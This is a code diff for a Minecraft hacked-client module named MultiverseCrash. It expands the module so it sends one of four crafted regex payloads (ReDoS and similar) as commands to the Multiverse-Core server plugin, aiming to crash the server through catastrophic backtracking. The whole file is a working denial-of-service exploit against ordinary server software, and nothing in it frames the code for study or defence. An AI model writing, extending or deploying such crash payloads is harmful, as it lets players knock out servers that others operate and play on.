@@ -1,9 +1,12 @@
+// Enhanced with methods from HackVogel/meteor-crash-addon (MIT License)
 package thunder.hack.features.modules.crash;
 
 import thunder.hack.features.modules.Module;
+import thunder.hack.setting.Setting;
 
 public class MultiverseCrash extends Module {
-    private int tick = 0;
+    private final Setting<Mode> mode = new Setting<>("Mode", Mode.ReDoS);
+    private boolean sent = false;
 
     public MultiverseCrash() {
         super("MultiverseCrash", Category.CRASH);
@@ -11,27 +14,33 @@ public class MultiverseCrash extends Module {
 
     @Override
     public void onEnable() {
-        tick = 0;
+        sent = false;
     }
 
     @Override
     public void onUpdate() {
-        if (mc.player == null) return;
-        tick++;
+        if (mc.player == null || sent) return;
+        sent = true;
 
-        if (tick == 1) {
-            mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
-            sendMessage("ReDoS commands sent");
+        switch (mode.getValue()) {
+            case ReDoS -> {
+                mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+                mc.player.networkHandler.sendCommand("mv help ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+            }
+            case Full -> mc.player.networkHandler.sendCommand("/MultiVerseCore:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+            case Help -> mc.player.networkHandler.sendCommand("mVhElP <*.*.*.*.*.*.*.>");
+            case New -> mc.player.networkHandler.sendCommand("mvh .*{9999}.*{9999}.*{9999}.*{9999}.$%");
         }
-
-        if (tick == 2) {
-            mc.player.networkHandler.sendCommand("mv help ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
-            disable();
-        }
+        sendMessage("Multiverse crash sent");
+        disable();
     }
 
     @Override
     public void onDisable() {
-        tick = 0;
+        sent = false;
+    }
+
+    public enum Mode {
+        ReDoS, Full, Help, New
     }
 }
